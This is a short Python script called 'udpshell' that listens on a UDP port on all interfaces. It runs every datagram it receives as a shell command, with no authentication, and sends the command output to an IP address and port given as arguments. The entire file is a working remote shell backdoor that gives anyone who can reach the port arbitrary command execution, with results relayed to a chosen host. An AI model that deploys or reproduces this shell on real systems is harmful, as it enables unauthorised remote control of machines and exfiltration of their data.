#!/usr/bin/python

import socket
import subprocess
import sys

#receive data, send to popen, send back

if(len(sys.argv) < 4):
	print("Usage: ./udpshell <recv_port> <send_ip> <send_port>")
	exit(1)

recv_ip = "0.0.0.0" 
recv_port = int(sys.argv[1])

send_ip = sys.argv[2]
send_port = int(sys.argv[3])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
sock.bind((recv_ip, recv_port))

sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP


while True:
	command, addr = sock.recvfrom(1024) # buffer size is 1024 bytes

	proc = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	output = proc.stdout.read() + proc.stderr.read()
	sock2.sendto(output, (send_ip, send_port))